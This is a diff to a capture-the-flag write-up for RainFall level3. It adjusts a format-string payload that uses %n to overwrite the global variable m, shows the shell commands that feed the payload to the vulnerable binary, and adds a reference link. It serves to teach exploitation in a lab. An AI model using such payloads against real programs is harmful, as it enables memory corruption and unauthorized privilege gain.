@@ -18,7 +18,7 @@ Here, our goal is to overwrite the global variable `m` (located at address `0x80
 We can achieve that by crafting a payload that prints 64 characters and then uses the `%n` format specifier to write the number of bytes printed so far into the memory address of `m`.
 
 ```bash
-level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60c%4$n")' >/tmp/payload
+level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%60c" + "%4$n")' >/tmp/payload
 level3@RainFall:~$ cat /tmp/payload - | ./level3
 �                                                           
 Wait what?!
@@ -37,3 +37,4 @@ printf(buffer);			// Vulnerable usage
 
 References
 - [Format String Attacks - OWASP](https://owasp.org/www-community/attacks/Format_string_attack)
+- [Hacking Lab - Format String Vulnerability](https://hackinglab.cz/en/blog/format-string-vulnerability/)
